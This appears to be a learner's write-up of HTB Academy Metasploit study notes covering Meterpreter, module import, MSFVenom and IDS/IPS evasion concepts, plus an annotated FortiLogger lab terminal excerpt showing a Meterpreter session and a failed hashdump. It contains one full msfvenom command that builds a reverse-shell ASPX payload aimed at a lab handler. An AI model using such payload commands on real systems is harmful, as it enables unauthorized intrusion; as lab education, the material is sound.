# Using the Metasploit Framework: Four-Section Study Notes and a FortiLogger Session Observation

> **Publication status: EVIDENCE PENDING.** This document combines study notes from four HTB Academy sections with one separately recorded FortiLogger terminal observation. It does not claim completion of any section, the full module, a successful `hashdump`, or privilege escalation.

## 1. Overview

| Field | Scope |
| --- | --- |
| Platform | Hack The Box Academy |
| Module | Using the Metasploit Framework |
| Sections covered by study notes | Meterpreter; Writing & Importing Modules; Introduction to MSFVenom; Firewall and IDS/IPS evasion |
| Category | Offensive security education |
| Module difficulty | Easy, per the official module preview |
| Lab date | Not verified |
| Learner status | Study coverage recorded; section and module completion not verified |
| Official reference | https://academy.hackthebox.com/course/preview/using-the-metasploit-framework |

The referenced learning conversation contains explanations and course examples for four sections of the HTB Academy module. A separate accessible conversation, titled “Metasploit Answers,” contains terminal output from a FortiLogger exercise. That output establishes a successful Meterpreter connection and a failed `hashdump` attempt. It does not establish the identity of the shell user, retrieval of an NTLM hash, administrative privilege, or module completion. The exact relationship of the FortiLogger exercise to the four studied sections is not verified.

## 2. Learning Objectives

- Explain Meterpreter's role after initial access and distinguish a session from elevated privileges.
- Describe how external Ruby modules are found, reviewed, installed, and loaded into Metasploit.
- Relate MSFVenom payload selection and file format to listener configuration and server execution requirements.
- Compare endpoint protection, perimeter controls, signatures, anomaly detection, protocol analysis, and SOC review.
- Interpret terminal checkpoints separately: vulnerability check, payload upload, session establishment, credential access, and privilege level.
- Preserve enough original evidence to support a later hands-on publication.

## 3. Technical Background

Meterpreter is a Metasploit payload that provides session commands and optional extensions after a compatible payload runs on an authorized target. A Meterpreter prompt proves that a session was established at that moment; it does not prove that the session has administrator or SYSTEM rights. Memory-oriented execution can reduce some disk artifacts, while process activity, memory behavior, and network traffic may remain visible to defenders.

Metasploit modules are organized by type. External Ruby exploit modules can be placed in a user module tree such as `~/.msf4/modules/`, following the expected directory structure. Importing code, loading a module, confirming a target is vulnerable, and successfully exploiting that target are distinct results. External modules should be reviewed before use.

MSFVenom uses `-p` to choose a payload and `-f` to choose an output format. The conversation's ASPX example concerns a Windows/IIS scenario. Generating an ASPX file alone cannot establish that it was uploaded or executed. The server must permit ASP.NET execution in the relevant location, and a matching, reachable handler is needed for the reverse connection.

The evasion notes describe endpoint controls and network perimeter controls. Static signatures, behavioral or statistical anomalies, stateful protocol analysis, and human SOC review observe different signals. Executable templates, archives, packers, encoding, and changes to recognizable exploit patterns may alter what a scanner observes, but none guarantees evasion. A detection or bypass claim requires an identified test environment and original results.

## 4. Lab Environment

The study notes mention a Metasploit-capable assessment host, a Windows/IIS target, FTP transfer, and a reverse TCP handler as instructional examples. The example address `10.10.14.5` and port `1337` are not verified as the learner's environment.

The separate FortiLogger terminal output shows a Metasploit run against FortiLogger version `4.4.2.2`, a reverse TCP handler, payload upload, and Meterpreter session 2. The source transcript contains lab IP addresses; they are omitted from this public-facing draft. The target's operating-system account and effective privilege were not captured in the supplied excerpt.

## 5. Methodology

The four study topics were mapped to the official HTB Academy section list. Course examples were separated from learner-generated output. The FortiLogger excerpt was then assessed checkpoint by checkpoint: automatic vulnerability check, reported payload upload, stage delivery, opened Meterpreter session, and `hashdump` response. Only the statements directly supported by that output are treated as observations. No independent lab run was performed while preparing this report.

## 6. Practical Walkthrough

### 6.1 Meterpreter — studied concept

The notes discuss sessions, channels, extensions, migration, and post-exploitation capabilities. They do not include an original `sysinfo`, `getuid`, or session listing for the four-section study sequence. Such details cannot be inferred from a conceptual explanation.

### 6.2 Writing & Importing Modules — studied concept

The notes use a Nagios3 Exploit-DB Ruby module as an import example and a Bludit module as an example for custom module structure. They cover module directories, `reload_all`, mixins, metadata, registered options, and exploit logic. No original module source, import transcript, module `info` output, or exploitation result was provided for this section.

### 6.3 Introduction to MSFVenom — instructional example

The learning conversation quotes the following command as an example, not as a command verified to have been run by the learner:

~~~shell
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=1337 -f aspx > reverse_shell.aspx
~~~

The notes then describe a matching `exploit/multi/handler`, FTP upload, an ASPX request, and possible use of `local_exploit_suggester`. No original output verifies those steps in this section. The suggester identifies candidate local exploits; a suggestion does not prove privilege escalation.

### 6.4 Firewall and IDS/IPS evasion — studied concept

The conversation describes executable templates, password-protected archives, packers, and recognizable exploit-code patterns. It includes no original antivirus scan, IDS/IPS alert, controlled comparison, measured detection rate, or successful bypass result.

### 6.5 FortiLogger — separately recorded terminal observation

An accessible “Metasploit Answers” conversation contains this terminal sequence. Network addresses have been omitted from the excerpt:

~~~text
[+] The target is vulnerable. FortiLogger version 4.4.2.2
[+] Generate Payload
[+] Payload has been uploaded
[*] Executing payload...
[*] Sending stage (190534 bytes) to [lab target]
[*] Meterpreter session 2 opened ([lab handler] -> [lab target])
(Meterpreter 2)(C:\Windows\system32) > hashdump
[-] priv_passwd_get_sam_hashes: Operation failed: Incorrect function.
~~~

The session-opened line supports a successful Meterpreter connection. The following error supports the opposite conclusion for the credential-dumping step: `hashdump` did **not** return SAM hashes in this attempt. The excerpt does not include `getuid`, a username, an NTLM hash, a flag, or evidence of SYSTEM access.

## 7. Troubleshooting

The only learner-observed failure in the accessible material is the FortiLogger `hashdump` error: `Incorrect function`. The available output does not establish its root cause. Possible causes should not be presented as a diagnosis without the session identity, architecture, privileges, and relevant system details. A future authorized retest should preserve those observations and the exact command response before drawing a conclusion.

No failure or corrective action was documented for the four section examples. Handler readiness, file placement, HTTP execution, session establishment, and effective privilege must be verified separately rather than inferred from an earlier checkpoint.

## 8. Results and Evidence

| Finding | Evidence status |
| --- | --- |
| Four Metasploit topics were studied | Supported by the referenced learning conversation |
| FortiLogger 4.4.2.2 was reported vulnerable by the Metasploit check | Supported by learner-supplied terminal text |
| FortiLogger payload upload and execution were reported | Supported by terminal status lines; no independent target-side verification supplied |
| Meterpreter session 2 opened | Supported by the original terminal line |
| `hashdump` returned an error | Supported by the original terminal line |
| NTLM hash retrieved | Not verified; no hash appears in the excerpt |
| Administrator/SYSTEM access | Not verified |
| Any section or full module completed | Not verified |
| Publishable lab screenshot | None available |

The supplied image is a website layout mockup with a terminal screenshot placeholder. It is not evidence of lab execution. The terminal text is useful documentary evidence, but the required genuine screenshots and progress context are still pending.

## 9. Security Implications

An authorized Metasploit assessment can expose weaknesses in public-facing applications. Defenders can correlate web requests, application file creation, upload logs, outbound callbacks, endpoint process and memory telemetry, and account activity. A successful reverse connection is an initial-access observation, not proof of elevated privileges or credential access. Failed post-exploitation commands are important findings because they define the actual limit of the observed access.

## 10. Lessons Learned

- Keep study coverage, exercise completion, and module completion separate.
- Treat each exploit workflow step as its own evidence checkpoint.
- Preserve the exact distinction between “session opened” and “credential dump succeeded.”
- Review third-party modules before loading them.
- Avoid treating payload encoding or packaging as a guaranteed defensive bypass.
- Redact sensitive details in published evidence while retaining original records privately.

## 11. References

1. Hack The Box Academy, [Using the Metasploit Framework](https://academy.hackthebox.com/course/preview/using-the-metasploit-framework) — official module and section names.
2. Rapid7 Metasploit Documentation, [How to use msfvenom](https://docs.metasploit.com/docs/using-metasploit/basics/how-to-use-msfvenom.html) — payload and format options.
3. Rapid7 Metasploit Documentation, [How payloads work](https://docs.metasploit.com/docs/using-metasploit/basics/how-payloads-work.html) — staged payload terminology.
4. Rapid7 Metasploit Documentation, [Managing Sessions](https://docs.metasploit.com/docs/using-metasploit/basics/managing-sessions.html) — session records and details.
5. Rapid7 Metasploit Documentation, [Meterpreter overview](https://docs.metasploit.com/docs/using-metasploit/advanced/meterpreter/meterpreter.html) — Meterpreter context.
